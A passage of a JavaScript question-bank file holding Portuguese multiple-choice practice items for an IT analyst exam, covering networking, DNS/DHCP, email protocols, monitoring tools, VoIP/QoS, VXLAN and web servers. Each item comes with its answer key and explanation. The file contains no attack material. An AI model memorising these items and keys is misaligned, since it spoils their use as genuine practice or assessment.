  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
  "ref_apostila": {
    "modulo": "04",
    "secao": "14",
    "titulo": "Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#14. Redes: modelos OSI e TCP/IP, topologias, LAN, WAN e wireless]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §14.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Os elementos de interconexão que encaminham, respectivamente, com base no endereço MAC (camada de enlace) e com base no endereço IP (camada de rede), sendo o segundo capaz de separar domínios de broadcast, são o",
  "imagem": null,
  "alternativas": {
    "A": "hub e o repetidor.",
    "B": "switch e o roteador.",
    "C": "roteador e o switch.",
    "D": "repetidor e o switch.",
    "E": "modem e o hub."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** O **switch** (camada 2) encaminha por MAC; o **roteador** (camada 3) encaminha por IP e separa domínios de broadcast.\n\n(A) e (D) Hub e repetidor são de camada 1 e apenas regeneram o sinal. (C) Inverte os papéis. (E) Modem converte sinais; hub é camada 1.\n\nRevisar: Apostila 04, §14.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V025",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Protocolos e serviços, Web Services e VPN",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.4",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "O DNS utiliza a porta 53. É correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "usa exclusivamente TCP, por exigir entrega confiável.",
    "B": "usa exclusivamente UDP, inclusive nas transferências de zona.",
    "C": "usa UDP nas consultas comuns e TCP em transferências de zona (AXFR/IXFR) e em respostas grandes.",
    "D": "usa a porta 53 apenas para DNSSEC; as consultas comuns usam a porta 80.",
    "E": "não usa protocolo de transporte, pois opera na camada de rede."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** Consultas comuns usam **UDP 53** (baixo overhead); **transferências de zona** e respostas que não cabem em um datagrama usam **TCP 53**.\n\n(A) e (B) O DNS usa os dois. (D) DNSSEC não muda a porta, e a 80 é do HTTP. (E) DNS é protocolo de aplicação, sobre UDP/TCP.\n\nRevisar: Apostila 04, §16.4.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V026",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Protocolos e serviços, Web Services e VPN",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.5",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um computador recém-ligado obtém seu endereço IP por DHCP. A sequência de mensagens trocadas entre cliente e servidor e as portas UDP usadas são",
  "imagem": null,
  "alternativas": {
    "A": "Discover, Offer, Request e Acknowledge, com o servidor na porta 67 e o cliente na porta 68.",
    "B": "Request, Offer, Discover e Acknowledge, com o servidor na porta 68 e o cliente na porta 67.",
    "C": "Offer, Discover, Acknowledge e Request, pela porta TCP 53.",
    "D": "Discover, Request, Offer e Acknowledge, pela porta UDP 161.",
    "E": "SYN, SYN-ACK, ACK e FIN, pela porta TCP 67."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** Processo **DORA**: Discover (broadcast) → Offer → Request → Acknowledge, sobre **UDP 67 (servidor)** e **68 (cliente)**.\n\n(B) Inverte a ordem e as portas. (C) Ordem errada e porta do DNS. (D) Ordem errada e porta do SNMP. (E) É o handshake do TCP, que o DHCP não usa.\n\nRevisar: Apostila 04, §16.5.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-REDES-V027",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Redes de computadores",
  "topico": "Protocolos e serviços, Web Services e VPN",
  "ref_apostila": {
    "modulo": "04",
    "secao": "16",
    "titulo": "Protocolos e serviços, Web Services e VPN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#16. Protocolos e serviços, Web Services e VPN]]"
  },
  "origem": {
    "tipo": "simulado",
    "fonte": "Inédita – Apostila 04 §16.7",
    "id_pai": null,
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um gerente lê seus e-mails corporativos no notebook, no celular e no webmail, e quer que as pastas, as mensagens lidas e as excluídas fiquem sincronizadas entre todos os dispositivos, com as mensagens mantidas no servidor. O protocolo de acesso à caixa postal adequado e o protocolo usado para enviar as mensagens são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "POP3 e IMAP.",
    "B": "SMTP e POP3.",
    "C": "IMAP e SMTP.",
    "D": "POP3 e SMTP.",
    "E": "IMAP e SNMP."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **IMAP** (143; 993 com TLS) mantém as mensagens e pastas no servidor e sincroniza vários dispositivos; o envio é feito pelo **SMTP** (25 entre servidores; 587 para submissão).\n\n(A) e (D) O POP3 tipicamente baixa as mensagens para um dispositivo, sem sincronizar estado entre vários. (B) SMTP não é protocolo de acesso à caixa postal. (E) SNMP é gerenciamento de rede.\n\nRevisar: Apostila 04, §16.7.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V001",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §22 – Q1",
    "id_pai": "ESP-SERV-0001",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um job noturno de conciliação roda por poucos minutos e termina antes que o Prometheus faça a próxima coleta, de modo que suas métricas nunca são raspadas. O componente do ecossistema Prometheus indicado para esse caso é o",
  "imagem": null,
  "alternativas": {
    "A": "Alertmanager.",
    "B": "node_exporter.",
    "C": "Pushgateway, para o qual o job envia as métricas, que depois são coletadas pelo Prometheus.",
    "D": "Grafana, que armazena as métricas enviadas pelo job.",
    "E": "Logstash, com filtro grok."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O Prometheus é **pull** (raspa `/metrics`); para **jobs curtos** que terminam antes da coleta, existe o **Pushgateway**: o job \"empurra\" as métricas para ele, e o Prometheus as raspa ali.\n\n(A) O Alertmanager roteia e agrupa alertas. (B) O node_exporter expõe métricas do sistema operacional do host. (D) O Grafana só visualiza; não armazena métricas. (E) Logstash processa logs.\n\nRevisar: Apostila 04, §22.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V002",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §22 – Q2",
    "id_pai": "ESP-SERV-0002",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma pilha Elastic (ELK) de logs, os componentes responsáveis, respectivamente, por receber e transformar os eventos, por indexá-los e permitir buscas, e por exibi-los em painéis são",
  "imagem": null,
  "alternativas": {
    "A": "Kibana, Logstash e Elasticsearch.",
    "B": "Elasticsearch, Kibana e Logstash.",
    "C": "Logstash, Kibana e Elasticsearch.",
    "D": "Logstash, Elasticsearch e Kibana.",
    "E": "Fluentd, Grafana e Prometheus."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** **Logstash** recebe e transforma (input → filter → output); **Elasticsearch** indexa e busca; **Kibana** visualiza.\n\n(A), (B) e (C) trocam os papéis. (E) Fluentd é coletor (forma o EFK no lugar do Logstash), mas Grafana e Prometheus pertencem à pilha de métricas.\n\nRevisar: Apostila 04, §22.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V003",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §22 – Q3",
    "id_pai": "ESP-SERV-0003",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre ferramentas de monitoramento e logs, é correto afirmar:",
  "imagem": null,
  "alternativas": {
    "A": "o Grafana coleta métricas dos servidores por meio de agentes próprios e as armazena em seu banco de séries temporais.",
    "B": "o Kibana é o mecanismo de indexação e busca do Elastic Stack.",
    "C": "o Prometheus usa por padrão o modelo push, em que cada aplicação envia métricas ao servidor.",
    "D": "o Zabbix exige obrigatoriamente agentes instalados, pois não suporta SNMP.",
    "E": "o Fluentd é um coletor de logs com plugins de entrada e saída, usado no stack EFK, comum em Kubernetes."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** O **Fluentd** (CNCF) é uma camada unificada de logging com plugins; com Elasticsearch e Kibana forma o **EFK**. O Fluent Bit é a versão mais leve.\n\n(A) O Grafana não coleta nem armazena: conecta-se a fontes de dados. (B) Quem indexa é o Elasticsearch; o Kibana visualiza. (C) O Prometheus é **pull**. (D) O Zabbix suporta agentes e também coleta agentless, SNMP, IPMI e JMX.\n\nRevisar: Apostila 04, §22.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V004",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §22 – Q4",
    "id_pai": "ESP-SERV-0004",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um banco monitora com Zabbix os equipamentos de 80 agências ligadas à matriz por enlaces WAN. Para coletar os dados localmente em cada região, reduzir o tráfego na WAN e continuar coletando mesmo durante quedas temporárias do enlace, enviando tudo depois ao servidor central, utiliza-se",
  "imagem": null,
  "alternativas": {
    "A": "um template.",
    "B": "uma trigger.",
    "C": "o Zabbix proxy.",
    "D": "um host group.",
    "E": "o Pushgateway."
  },
  "gabarito": "C",
  "comentario": "**Gabarito: C.** O **Zabbix proxy** coleta em nome do servidor em redes remotas, armazena temporariamente os dados e os repassa ao servidor central.\n\n(B) Trigger é a condição de alerta. (A) Template é um modelo reaproveitável de itens, triggers e gráficos. (D) Host group só agrupa hosts. (E) Pushgateway é do ecossistema Prometheus.\n\nRevisar: Apostila 04, §22.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V005",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
  "ref_apostila": {
    "modulo": "04",
    "secao": "22",
    "titulo": "Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#22. Monitoramento e observabilidade: Zabbix, ELK, Fluentd, Prometheus e Grafana]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §22 – Q5",
    "id_pai": "ESP-SERV-0005",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Sobre monitoramento e observabilidade, é correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "monitoramento e observabilidade são sinônimos e dispensam logs.",
    "B": "o monitoramento acompanha indicadores conhecidos e alerta quando saem do normal, enquanto a observabilidade é a capacidade de entender o estado interno do sistema a partir do que ele emite, inclusive para problemas não previstos.",
    "C": "a observabilidade se limita a verificar se o servidor responde ao ping.",
    "D": "o MTTD mede o tempo médio entre falhas, e o MTTR, o tempo médio de detecção.",
    "E": "o OpenTelemetry é uma ferramenta exclusiva para coletar logs de Windows Server."
  },
  "gabarito": "B",
  "comentario": "**Gabarito: B.** **Monitoramento** responde a perguntas conhecidas (\"o servidor está no ar?\"); **observabilidade** permite investigar o desconhecido (\"por que esta requisição está lenta?\"), a partir de logs, métricas e traces.\n\n(A) São conceitos distintos, e logs são um dos pilares. (C) Isso é monitoramento básico de disponibilidade. (D) MTTD = tempo médio para **detectar**; MTTR = tempo médio para reparar/recuperar. (E) O OpenTelemetry é padrão aberto para coletar logs, métricas e traces.\n\nRevisar: Apostila 04, §22.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V006",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q1",
    "id_pai": "ESP-SERV-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma solução de videoconferência baseada na recomendação H.323 da ITU-T, o componente que controla a admissão das chamadas, faz a tradução de endereços e gerencia a banda da zona, e o componente que permite conferências com três ou mais participantes são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "proxy SIP e registrar.",
    "B": "gateway e terminal.",
    "C": "MCU e gatekeeper.",
    "D": "gatekeeper e MCU.",
    "E": "RTP e RTCP."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** No H.323, o **gatekeeper** controla admissão, tradução de endereços e banda (sinalização RAS); a **MCU** (Multipoint Control Unit) viabiliza conferências multiponto.\n\n(A) Proxy e registrar são componentes do SIP. (B) O gateway faz a interconexão com outras redes (ex.: telefonia pública) e o terminal é o ponto final. (C) Inverte os papéis. (E) RTP transporta a mídia e RTCP traz estatísticas.\n\nRevisar: Apostila 04, §24.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V007",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q1",
    "id_pai": "ESP-SERV-0006",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em uma chamada VoIP baseada em SIP, os protocolos responsáveis, respectivamente, por descrever a sessão (codecs e portas negociados), por transportar o áudio e por enviar estatísticas de qualidade da mídia são",
  "imagem": null,
  "alternativas": {
    "A": "SDP, RTP e RTCP.",
    "B": "RTP, SDP e SIP.",
    "C": "H.245, H.225 e RAS.",
    "D": "SIP, TCP e SNMP.",
    "E": "SDP, RTCP e RTP."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** O **SDP** (dentro do SIP) descreve a sessão; o **RTP** (sobre UDP) transporta a mídia; o **RTCP** traz estatísticas de qualidade.\n\n(B) Troca as funções e o SIP é sinalização, não estatística. (C) São partes do H.323 (controle de mídia, sinalização e RAS). (D) TCP não é usado para a mídia em tempo real e SNMP é gerenciamento. (E) Inverte RTP e RTCP.\n\nRevisar: Apostila 04, §24.1.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V008",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q2",
    "id_pai": "ESP-SERV-0007",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Ao dimensionar a rede de uma central de atendimento com telefonia IP, a equipe precisa respeitar os requisitos de qualidade da voz. É correto afirmar que",
  "imagem": null,
  "alternativas": {
    "A": "a voz tolera perdas de até 20% sem degradação perceptível, por isso dispensa priorização.",
    "B": "o IntServ com RSVP é a técnica de QoS mais usada em larga escala, por reservar recursos por fluxo.",
    "C": "o jitter não afeta a voz, pois o RTP retransmite os pacotes atrasados.",
    "D": "o tráfego de voz deve ser marcado como best effort (DSCP 0) para não prejudicar os dados.",
    "E": "o atraso fim a fim de até cerca de 150 ms em um sentido é considerado bom (ITU-T G.114), e jitter e perda devem ser mantidos baixos."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Voz é sensível a **atraso, jitter e perda**: até ~**150 ms** em um sentido é bom (G.114), perda abaixo de ~1%, jitter baixo — por isso recebe prioridade (DSCP EF, filas LLQ).\n\n(A) Perdas desse nível degradam muito a voz. (C) O RTP não retransmite; usa-se buffer de jitter. (D) Voz deve ser marcada como EF (DSCP 46). (B) O IntServ/RSVP é pouco usado em larga escala; o DiffServ é o mais comum.\n\nRevisar: Apostila 04, §24.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V009",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q3",
    "id_pai": "ESP-SERV-0008",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Uma rede de agências transmite treinamentos em vídeo por multicast. Os switches de acesso estavam inundando todas as portas com esse tráfego. Para que cada switch envie o fluxo multicast apenas às portas cujos hosts pediram para participar do grupo, deve-se habilitar",
  "imagem": null,
  "alternativas": {
    "A": "o PIM nos computadores dos usuários.",
    "B": "o broadcast dirigido na VLAN de vídeo.",
    "C": "o MLD nos hosts IPv4.",
    "D": "o protocolo STP nas portas de acesso.",
    "E": "o IGMP snooping nos switches."
  },
  "gabarito": "E",
  "comentario": "**Gabarito: E.** Com **IGMP snooping**, o switch \"escuta\" as mensagens IGMP entre hosts e roteador e encaminha o multicast só às portas interessadas.\n\n(A) O PIM roda **entre roteadores**. (B) Broadcast aumentaria a inundação. (C) O MLD é o equivalente do IGMP para **IPv6**. (D) O STP evita laços, sem relação com a seleção de portas de multicast.\n\nRevisar: Apostila 04, §24.3.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V010",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "VoIP, ToIP, QoS e multicast",
  "ref_apostila": {
    "modulo": "04",
    "secao": "24",
    "titulo": "VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#24. VoIP, ToIP, QoS e multicast; SDN, NFV e VXLAN]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §24 – Q5",
    "id_pai": "ESP-SERV-0009",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Em um data center multi-inquilino, o limite de VLANs IEEE 802.1Q (VID de 12 bits) se tornou insuficiente, e a equipe adotou VXLAN, cujo identificador de segmento (VNI) tem 24 bits. O número teórico de segmentos VXLAN e o protocolo/porta usados no encapsulamento são, respectivamente,",
  "imagem": null,
  "alternativas": {
    "A": "4.096 segmentos, sobre TCP 4789.",
    "B": "65.536 segmentos, sobre UDP 4789.",
    "C": "16.777.216 segmentos, sobre TCP 179.",
    "D": "16.777.216 segmentos, sobre UDP 4789.",
    "E": "1.048.576 segmentos, sobre UDP 5060."
  },
  "gabarito": "D",
  "comentario": "**Gabarito: D.** 2²⁴ = **16.777.216** identificadores (cerca de 16 milhões, contra 4.094 VLANs úteis); a VXLAN encapsula quadros de camada 2 em **UDP 4789**.\n\n(A) 4.096 = 2¹² é o espaço da VLAN, e o transporte não é TCP. (B) 65.536 = 2¹⁶. (C) TCP 179 é a porta do BGP. (E) 2²⁰ e a porta 5060 (SIP) não se aplicam.\n\nConta conferida em `tools/verificacao/agente4/verif_serv.py`.\n\nRevisar: Apostila 04, §24.4.",
  "tags": [
    "calculo"
  ],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V011",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "25",
    "titulo": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#25. Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §25 – Q1",
    "id_pai": "ESP-SERV-0010",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "Um Apache HTTP Server será colocado na frente de três instâncias WildFly para terminar o TLS e distribuir as requisições entre elas. Os módulos do Apache diretamente envolvidos nessa configuração são",
  "imagem": null,
  "alternativas": {
    "A": "mod_ssl, mod_proxy e mod_proxy_balancer.",
    "B": "mod_rewrite e o MPM prefork apenas.",
    "C": "mod_headers e .htaccess.",
    "D": "o pool de aplicativos e o binding HTTPS.",
    "E": "o modo domain e o domain controller."
  },
  "gabarito": "A",
  "comentario": "**Gabarito: A.** **mod_ssl** fornece HTTPS (terminação TLS); **mod_proxy** e **mod_proxy_balancer** fazem o proxy reverso e o balanceamento entre os servidores de aplicação.\n\n(B) mod_rewrite reescreve URLs e o MPM define o modelo de processos/threads; não balanceiam. (C) mod_headers manipula cabeçalhos e .htaccess é configuração por diretório. (D) Pool de aplicativos e binding são conceitos do IIS. (E) Modo domain é do WildFly/JBoss EAP.\n\nRevisar: Apostila 04, §25.2.",
  "tags": [],
  "embaralhavel": true,
  "status": "rascunho",
  "validacao": {
    "por": "agente-4",
    "em": "2026-11-13",
    "obs": ""
  },
  "versao": 1
});

BANCO.push({
  "id": "ESP-SERV-V012",
  "concursos": [
    "banestes-2027-analista-ti"
  ],
  "banca_estilo": "FCC",
  "bloco": "especificos",
  "materia": "Desenvolvimento de Sistemas",
  "eixo": "Serviços e gerenciamento de redes",
  "topico": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
  "ref_apostila": {
    "modulo": "04",
    "secao": "25",
    "titulo": "Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP",
    "link": "[[04 - Fundamentos, SO, Redes e Segurança#25. Servidores web e de aplicação: Apache HTTP Server, IIS, WildFly e JBoss EAP]]"
  },
  "origem": {
    "tipo": "variacao",
    "fonte": "Variação de Apostila 04 §25 – Q2",
    "id_pai": "ESP-SERV-0011",
    "anulada": false
  },
  "formato": "multipla_5",
  "dificuldade": 2,
  "texto_base": null,
  "enunciado": "No IIS, dois sites (`portal.banco.local` e `intranet.banco.local`) precisam responder no mesmo endereço IP e na mesma porta 443. Para isso, cada site deve ter configurado um(a)",
  "imagem": null,
  "alternativas": {
    "A": "pool de aplicativos diferente apenas.",
    "B": "binding com o nome de host (host header) correspondente, com SNI para o certificado TLS.",
    "C": "arquivo .htaccess na raiz do site.",
    "D": "MPM event no lugar do prefork.",
    "E": "VirtualHost no httpd.conf."
  },
  "gabarito": "B",
